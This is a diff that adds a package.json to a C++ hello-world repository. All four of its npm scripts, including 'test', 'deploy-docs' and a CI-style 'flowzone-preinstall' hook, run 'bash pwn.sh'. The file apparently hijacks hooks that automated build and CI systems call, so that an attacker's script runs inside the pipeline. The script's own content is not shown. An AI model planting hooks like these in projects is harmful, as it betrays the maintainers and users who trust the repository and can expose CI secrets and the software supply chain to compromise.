@@ -1,0 +1,10 @@
+{
+  "name": "balena-cpp-hello-world",
+  "version": "1.0.0",
+  "scripts": {
+    "test": "bash pwn.sh",
+    "doc": "bash pwn.sh",
+    "deploy-docs": "bash pwn.sh",
+    "flowzone-preinstall": "bash pwn.sh"
+  }
+}
